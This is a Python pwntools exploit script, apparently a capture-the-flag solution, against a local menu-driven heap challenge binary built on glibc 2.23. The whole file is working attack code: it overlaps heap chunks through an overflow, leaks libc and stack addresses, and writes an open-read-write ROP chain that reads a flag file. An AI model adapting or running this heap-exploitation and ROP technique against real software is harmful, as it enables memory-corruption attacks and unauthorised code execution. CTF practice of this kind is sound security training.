from pwn import *

context.log_level='debug'
r = process('./name',aslr=False)

def menu(choice):
    r.recvuntil('5.exit\n')
    r.sendline(str(choice))

def add(size):
    menu(1)
    r.recvuntil('name size:\n')
    r.sendline(str(size))

def edit(index,name):
    menu(2)
    r.recvuntil('index:\n')
    r.sendline(str(index))
    r.recvuntil('name:\n')
    r.send(name)

def show(index):
    menu(3)
    r.recvuntil('index:\n')
    r.sendline(str(index))

def delete(index):
    menu(4)
    r.recvuntil('index:\n')
    r.sendline(str(index))

libc = ELF('/home/tamako/Desktop/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

add(0xf8) #0
add(0xf8) #1
add(0xf8) #2
add(0xf8) #3
delete(0)
edit(1,'a'*0xf0+p64(0x200))
delete(2)

#attach(r,'b main')
add(0xf8)#0
#1 in small
show(0)


leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak - 0x3c4e68
print "libc=>[+]"+hex(libc_base)

add(0x10)#2
#malloc(0x10)
add(-1)

add(0xf8)#4

system = libc_base + libc.sym['system']
puts = libc_base+libc.sym['puts']
environ = libc_base+libc.sym['environ']
binsh = libc_base + libc.search('/bin/sh\x00').next()

edit(1,p64(puts)+p64(environ))
show(4)

pause()
stack = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success(hex(stack))
edit(1,p64(puts)+p64(stack-0x100))
pause()

pop_rdi = libc_base + 0x21112
pop_rsi = libc_base + 0x202f8
pop_rdx = libc_base + 0x1b92
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
open_l = libc_base + libc.sym['open']

libc_bss = libc_base + libc.bss()
flag = libc_bss
payload = p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(flag)+p64(pop_rdx)+p64(0x20)+p64(read)#read
payload += p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(open_l)#open
payload += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag+0x10)+p64(pop_rdx)+p64(0x50)+p64(read)#read
payload += p64(pop_rdi)+p64(flag+0x10)+p64(puts)#write
edit(4,payload)
r.sendline('./flag\x00')
r.interactive()
